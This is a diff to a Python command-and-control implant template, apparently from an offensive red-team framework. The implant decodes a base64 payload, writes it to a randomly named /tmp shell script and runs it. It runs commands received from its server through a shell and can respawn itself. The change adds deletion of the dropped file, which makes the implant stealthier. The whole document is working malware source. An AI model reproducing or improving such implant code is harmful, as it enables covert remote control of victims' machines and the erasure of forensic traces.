@@ -41,14 +41,18 @@ urls = [%s]
 killdate = "%s"
 useragent = ""
 
-def sai():
+def sai(delfile=False):
+  import uuid
+  filename = "/tmp/%%s.sh" %% (uuid.uuid4().hex)
   imbase = "%s"
   imfull = base64.b64decode(imbase)
-  output_file = open("/tmp/fdjskla.sh", 'w')
+  output_file = open(filename, 'w')
   output_file.write(imfull)
   output_file.close()
   import subprocess
-  p = subprocess.Popen(["sh", "/tmp/fdjskla.sh"])
+  p = subprocess.Popen(["sh", filename])
+  if delfile:
+    p = subprocess.Popen(["rm", filename])
 
 def decrypt_bytes_gzip( key, data):
   iv = data[0:16]
@@ -89,8 +93,10 @@ while(True):
           #print cmd
           if "$sleeptime" in cmd:
             timer = int(cmd.replace("$sleeptime = ",""))
-          elif "startanotherimplant" in cmd:   
-            sai()
+          elif cmd == "startanotherimplant":   
+            sai(delfile=True)
+          elif "startanotherimplant-keepfile" in cmd:   
+            sai()  
           else:
             returnval = subprocess.check_output(cmd, shell=True)
             #print returnval
